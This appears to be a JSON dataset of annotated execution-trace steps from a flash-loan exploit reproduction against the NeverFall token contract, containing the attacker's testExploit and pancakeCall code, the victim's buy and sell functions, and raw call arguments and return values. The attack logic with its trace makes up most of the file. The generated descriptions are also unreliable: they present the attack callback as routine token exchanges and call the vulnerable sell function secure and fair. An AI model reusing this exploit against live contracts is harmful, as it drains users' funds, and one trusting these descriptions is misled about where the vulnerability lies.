[
    {
        "id": "595680",
        "args": "",
        "original_code": "    function testExploit() public {\n        uint256 flashLoanAmount = 1_600_000 * 1e18;\n        IUniswapV2Pair(busd_usdt_pool).swap(flashLoanAmount, 0, address(this), new bytes(1));\n    }\n\n",
        "description": "1. **Core function**:  \nThe `testExploit` function is designed to simulate a flash loan transaction. It borrows a large amount of tokens (1,600,000 tokens with 18 decimal places) from a specific liquidity pool (BUSD-USDT pool) on Uniswap V2. The function then swaps these tokens, but it does not specify any further actions after the swap. Its primary role is to test or demonstrate how a flash loan can be executed in a decentralized finance (DeFi) environment.\n\n2. **Security mechanism**:  \nThis function does not include explicit security mechanisms such as access control or input validation. It is a public function, meaning anyone can call it, which could pose risks if used in a production environment. The function relies on the underlying Uniswap V2 protocol for handling the swap, but it does not implement additional safeguards like checking for reentrancy or ensuring the transaction is atomic.\n\n3. **Parameter Function**:  \nThe function does not take any parameters directly. However, it uses hardcoded values internally:  \n- `flashLoanAmount`: Specifies the amount of tokens to borrow (1,600,000 tokens with 18 decimal places).  \n- `busd_usdt_pool`: Represents the address of the BUSD-USDT liquidity pool on Uniswap V2.  \n- `new bytes(1)`: Passes an empty byte array as data to the swap function, which is a placeholder for additional information that could be used in more complex transactions.  \n\n4. **Return description**:  \nThe function does not return any value. Its purpose is to execute a flash loan and swap operation, and it does not calculate or provide an output. The focus is on the action of borrowing and swapping tokens rather than producing a result.\n\n**In summary**, the `testExploit` function demonstrates how to execute a flash loan and swap on Uniswap V2. It lacks built-in security measures and is primarily intended for testing or educational purposes. The function uses hardcoded values for the loan amount and pool address, and it does not return any value after execution.",
        "return_value": "Returned"
    },
    {
        "id": "589377",
        "args": "1600000000000000000000000 [1.6e24], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "12871",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1600000000000000000000000 [1.6e24]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "543073",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1600000000000000000000000 [1.6e24], 0, 0x00",
        "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        uint256 usdtBalance = IERC20(usdt).balanceOf(address(this));\n        IERC20(usdt).approve(neverFall, type(uint256).max);\n        IERC20(usdt).approve(router, type(uint256).max);\n        // buy neverfall\n        INeverFall(neverFall).buy(200_000 * 1e18);\n        bscSwap(usdt, neverFall, 1_400_000 * 1e18);\n        // sell neverfall\n        INeverFall(neverFall).sell(75_500_000 * 1e18);\n\n        IERC20(usdt).transfer(msg.sender, usdtBalance + usdtBalance * 30 / 10_000);\n        emit log_named_decimal_uint(\"[After Attacks]  Attacker usdt balance\", IERC20(usdt).balanceOf(address(this)), 18);\n    }\n\n",
        "description": "1. **Core functions:**  \n   This function is designed to perform a series of actions involving the exchange of tokens. It starts by checking the balance of a specific token (USDT) in the contract. Then, it approves two different contracts (neverFall and router) to spend an unlimited amount of USDT on behalf of the contract. Next, it buys a large amount of another token (neverFall) using USDT, swaps a significant amount of USDT for neverFall, and then sells a substantial amount of neverFall back. Finally, it transfers the remaining USDT balance, including a small profit, to the caller of the function and logs the final USDT balance.\n\n2. **Security mechanism:**  \n   The function uses the `external` modifier, which restricts its access to external calls only, meaning it cannot be called internally within the contract. Additionally, it relies on the `approve` function to grant spending permissions to other contracts, ensuring that only authorized contracts can interact with the USDT tokens. However, there are no explicit checks or safeguards against potential reentrancy attacks or unauthorized access, which could pose security risks.\n\n3. **Parameter Function:**  \n   - `sender`: Represents the address of the entity initiating the call. It is not actively used in the function but could be logged or checked for additional security.  \n   - `amount0` and `amount1`: These parameters represent amounts of tokens involved in the transaction. They are not directly used in the function, suggesting they might be placeholders or part of a larger system.  \n   - `data`: This is a placeholder for additional information that could be passed to the function. It is not utilized in the current implementation.  \n\n4. **Return description:**  \n   The function does not explicitly return a value. Instead, it performs actions like transferring tokens and emitting an event to log the final USDT balance. The calculation logic for the transfer involves taking the current USDT balance, adding a small percentage (0.3%) as profit, and sending the total to the caller. The event logs the updated USDT balance after all operations are completed.\n\n**In summary,**  \nThis function facilitates a series of token exchanges, primarily involving USDT and another token called neverFall. It approves spending permissions, buys and sells tokens, and transfers a final balance with a small profit to the caller. While it includes some basic security measures like external access control, it lacks advanced protections against potential vulnerabilities. The parameters are mostly unused, and the function focuses on executing transactions rather than returning specific values.",
        "return_value": "Returned"
    },
    {
        "id": "531",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "1600000010000000000000000 [1.6e24]"
    },
    {
        "id": "24562",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "24562",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "282269",
        "args": "200000000000000000000000 [2e23]",
        "original_code": "    function buy(uint256 amountU) public returns(uint256){\n        require(startBuy,\"not start\");\n        //\u6536usdt\n        IERC20(usdtAddress).safeTransferFrom(msg.sender,address(this),amountU);\n\n        uint256 beforeLiquidityAmount = balanceOf(address(this));\n        //90%\u52a0\u6c60\u5b50\n        IERC20(usdtAddress).approve(uniswapV2Router,amountU);\n        addLiquidity(initSupply, amountU * buyAddLiqFee / 100);\n        uint256 afterLiquidityAmount = balanceOf(address(this));\n        //5%\u7684usdt\u8d2d\u4e70\n        buySwap(amountU * buySwapFee / 100);\n        super._transfer(address(this), msg.sender, beforeLiquidityAmount - afterLiquidityAmount - balanceOf(pairTempAddress)); \n        super._transfer(pairTempAddress, address(this), balanceOf(pairTempAddress));\n        //\u8425\u9500\n        IERC20(usdtAddress).safeTransfer(marketingAddress,amountU * buyMarketingFee / 100);\n        emit BuyNF(msg.sender,amountU);\n        return beforeLiquidityAmount - afterLiquidityAmount - balanceOf(pairTempAddress);\n    } \n\n    event SellNF(address indexed account,uint256 indexed amount,uint256 indexed amountU);\n    event Reward(address indexed account,uint256 amount);\n\n",
        "description": "1. **Core functions:**\n   The `buy` function allows a user to purchase tokens using USDT. It first checks if the buying process has started. Then, it transfers the specified amount of USDT from the user to the contract. Next, it calculates the liquidity before and after adding 90% of the USDT to a liquidity pool. It also performs a swap with 5% of the USDT to buy tokens. The function then transfers the remaining tokens to the user and moves some tokens to a temporary pair address. Finally, it sends a portion of the USDT to a marketing address and emits an event to log the purchase.\n\n2. **Security mechanism:**\n   - `require(startBuy, \"not start\");`: Ensures that the buying process has started before allowing any transactions.\n   - `safeTransferFrom`: Safely transfers USDT from the user to the contract to prevent issues like insufficient balance or unauthorized transfers.\n   - `approve`: Approves the Uniswap router to spend the USDT on behalf of the contract.\n   - `super._transfer`: Uses the parent contract's transfer function to securely move tokens between addresses.\n\n3. **Parameter Function:**\n   - `uint256 amountU`: This parameter represents the amount of USDT the user wants to use to buy tokens. It determines how much USDT is transferred, added to liquidity, swapped, and sent to marketing.\n\n4. **Return description:**\n   The function returns the difference in token balance before and after adding liquidity, minus the tokens held in the temporary pair address. This value represents the number of tokens the user receives from the purchase.\n\nIn summary, the `buy` function facilitates the purchase of tokens using USDT, ensuring security through various checks and transfers. It calculates and returns the tokens the user receives after adding liquidity and performing a swap.",
        "return_value": "83520176359726925202079336 [8.352e25]"
    },
    {
        "id": "10834",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 200000000000000000000000 [2e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "7462",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 200000000000000000000000 [2e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "133358",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x55d398326f99059fF775485246999027B3197955, 99900000000000000000000000000 [9.99e28], 184000000000000000000000 [1.84e23], 1, 184000000000000000000000 [1.84e23], 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 1683045919 [1.683e9]",
        "original_code": null,
        "description": null,
        "return_value": "83520176359726925202079336 [8.352e25], 184000000000000000000000 [1.84e23], 3918514659767012722445607 [3.918e24]"
    },
    {
        "id": "2676",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x55d398326f99059fF775485246999027B3197955",
        "original_code": null,
        "description": null,
        "return_value": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c"
    },
    {
        "id": "2893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "390749131999675869539950 [3.907e23], 177366502266430132318230923 [1.773e26], 1683045649 [1.683e9]"
    },
    {
        "id": "22682",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, 83520176359726925202079336 [8.352e25]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "10834",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, 184000000000000000000000 [1.84e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "82236",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5",
        "original_code": null,
        "description": null,
        "return_value": "3918514659767012722445607 [3.918e24]"
    },
    {
        "id": "531",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "574749131999675869539950 [5.747e23]"
    },
    {
        "id": "608",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "260886678626157057520310259 [2.608e26]"
    },
    {
        "id": "2354",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x0ED943Ce24BaEBf257488771759F9BF482C39706"
    },
    {
        "id": "63655",
        "args": "8000000000000000000000 [8e21], 0, [0x55d398326f99059fF775485246999027B3197955, 0x5ABDe8B434133C98c36F4B21476791D95D888bF5], 0xE5aaa64f7CE48027457E661258113650D584DFee, 1683045919 [1.683e9]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "6034",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, 8000000000000000000000 [8e21]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2608",
        "args": "0xE5aaa64f7CE48027457E661258113650D584DFee",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "574749131999675869539950 [5.747e23], 260886678626157057520310259 [2.608e26], 1683045919 [1.683e9]"
    },
    {
        "id": "531",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "582749131999675869539950 [5.827e23]"
    },
    {
        "id": "45839",
        "args": "0, 3572630200059899042909716 [3.572e24], 0xE5aaa64f7CE48027457E661258113650D584DFee, 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "30672",
        "args": "0xE5aaa64f7CE48027457E661258113650D584DFee, 3572630200059899042909716 [3.572e24]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "582749131999675869539950 [5.827e23]"
    },
    {
        "id": "608",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "257314048426097158477400543 [2.573e26]"
    },
    {
        "id": "608",
        "args": "0xE5aaa64f7CE48027457E661258113650D584DFee",
        "original_code": null,
        "description": null,
        "return_value": "3572630200059899042909716 [3.572e24]"
    },
    {
        "id": "8071",
        "args": "0x712f6993F8E1A3DE6ACF2f4adF8Ab102748edc88, 8000000000000000000000 [8e21]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2562",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "61655",
        "args": "1400000000000000000000000 [1.4e24], 0, [0x55d398326f99059fF775485246999027B3197955, 0x5ABDe8B434133C98c36F4B21476791D95D888bF5], 0x051d6a5f987e4fc53B458eC4f88A104356E6995a, 1683045919 [1.683e9]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "6034",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, 1400000000000000000000000 [1.4e24]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2608",
        "args": "0x051d6a5f987e4fc53B458eC4f88A104356E6995a",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "582749131999675869539950 [5.827e23], 257314048426097158477400543 [2.573e26], 1683045919 [1.683e9]"
    },
    {
        "id": "531",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "1982749131999675869539950 [1.982e24]"
    },
    {
        "id": "43839",
        "args": "0, 181553227846560717220996778 [1.815e26], 0x051d6a5f987e4fc53B458eC4f88A104356E6995a, 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "28672",
        "args": "0x051d6a5f987e4fc53B458eC4f88A104356E6995a, 181553227846560717220996778 [1.815e26]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "1982749131999675869539950 [1.982e24]"
    },
    {
        "id": "608",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "75760820579536441256403765 [7.576e25]"
    },
    {
        "id": "608",
        "args": "0x051d6a5f987e4fc53B458eC4f88A104356E6995a",
        "original_code": null,
        "description": null,
        "return_value": "181553227846560717220996778 [1.815e26]"
    },
    {
        "id": "115354",
        "args": "75500000000000000000000000 [7.55e25]",
        "original_code": "    function sell(uint256 amount) public returns(uint256){\n        super._transfer(msg.sender, address(this), amount);\n        //\u64a4\u6c60\u5b50 \u9000\u7ed9\u7528\u6237U\n        uint256 balanceNF = this.balanceOf(uniswapV2Pair);\n        uint256 pairTotalSupply = IERC20(uniswapV2Pair).totalSupply();\n        uint256 needLiquidity = amount * pairTotalSupply / balanceNF;\n        \n        uint256 beforeU = IERC20(usdtAddress).balanceOf(address(this));\n        removeLiquidity(needLiquidity,amount * 90 / 100,0);\n        uint256 afterU = IERC20(usdtAddress).balanceOf(address(this));\n        uint256 outU =  afterU - beforeU;\n\n        IERC20(usdtAddress).safeTransfer(msg.sender, outU * sellFee / 100);\n         //\u8425\u9500\n        IERC20(usdtAddress).safeTransfer(marketingAddress,outU * sellMarketingFee / 100);\n        emit SellNF(msg.sender,amount,outU);\n        return outU * sellFee / 100;  \n    }\n\n\n",
        "description": "1. Core functions:  \nThe `sell` function allows a user to sell a specified amount of tokens and receive a corresponding amount of USDT (a stablecoin) in return. It works by transferring the user's tokens to the contract, calculating the required liquidity to be removed from a decentralized exchange pool, and then distributing the USDT to the user and a marketing address based on predefined fee percentages.\n\n2. Security mechanism:  \n- The function uses `super._transfer` to securely transfer tokens from the user to the contract.  \n- It calculates liquidity removal carefully to ensure the user receives a fair amount of USDT.  \n- The `safeTransfer` method is used to securely transfer USDT to the user and the marketing address, preventing potential errors or failures.  \n- The function emits an event (`SellNF`) to log the transaction details for transparency and tracking.  \n\n3. Parameter Function:  \n- `amount`: This parameter specifies the number of tokens the user wants to sell. It determines how much liquidity is removed from the pool and how much USDT the user will receive.  \n\n4. Return description:  \nThe function returns the amount of USDT the user receives after applying the `sellFee` percentage. This value is calculated by subtracting the contract's USDT balance before and after removing liquidity, applying the fee, and returning the result.  \n\nIn summary,  \nThe `sell` function enables users to sell their tokens for USDT, ensuring secure transfers and fair distribution of funds. It carefully calculates liquidity removal and applies fees before returning the final USDT amount to the user.",
        "return_value": "1679050894541677726514604 [1.679e24]"
    },
    {
        "id": "608",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "75760820579536441256403765 [7.576e25]"
    },
    {
        "id": "439",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "12240015757766824861408624 [1.224e25]"
    },
    {
        "id": "531",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5",
        "original_code": null,
        "description": null,
        "return_value": "10920 [1.092e4]"
    },
    {
        "id": "85360",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x55d398326f99059fF775485246999027B3197955, 12197877248982797510354403 [1.219e25], 67950000000000000000000000 [6.795e25], 0, 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 1683045919 [1.683e9]",
        "original_code": null,
        "description": null,
        "return_value": "75478252429058064682693305 [7.547e25], 1975353993578444384134829 [1.975e24]"
    },
    {
        "id": "27476",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, 12197877248982797510354403 [1.219e25]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "55497",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5",
        "original_code": null,
        "description": null,
        "return_value": "1975353993578444384134829 [1.975e24], 75478252429058064682693305 [7.547e25]"
    },
    {
        "id": "531",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "1982749131999675869539950 [1.982e24]"
    },
    {
        "id": "608",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "75760820579536441256403765 [7.576e25]"
    },
    {
        "id": "354",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x0ED943Ce24BaEBf257488771759F9BF482C39706"
    },
    {
        "id": "6071",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 1975353993578444384134829 [1.975e24]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "4772",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 75478252429058064682693305 [7.547e25]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "7395138421231485405121 [7.395e21]"
    },
    {
        "id": "608",
        "args": "0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c",
        "original_code": null,
        "description": null,
        "return_value": "282568150478376573710460 [2.825e23]"
    },
    {
        "id": "531",
        "args": "0x5ABDe8B434133C98c36F4B21476791D95D888bF5",
        "original_code": null,
        "description": null,
        "return_value": "1975353993578444384145749 [1.975e24]"
    },
    {
        "id": "6071",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1679050894541677726514604 [1.679e24]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "3271",
        "args": "0x712f6993F8E1A3DE6ACF2f4adF8Ab102748edc88, 296303099036766657620224 [2.963e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "3271",
        "args": "0x7EFaEf62fDdCCa950418312c6C91Aef321375A00, 1604800010030000000000000 [1.604e24]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "74250894511677726514604 [7.425e22]"
    },
    {
        "id": "531",
        "args": "0x7EFaEf62fDdCCa950418312c6C91Aef321375A00",
        "original_code": null,
        "description": null,
        "return_value": "74958965123222575972654468 [7.495e25]"
    },
    {
        "id": "2531",
        "args": "0x7EFaEf62fDdCCa950418312c6C91Aef321375A00",
        "original_code": null,
        "description": null,
        "return_value": "74784099932425533361543436 [7.478e25]"
    }
]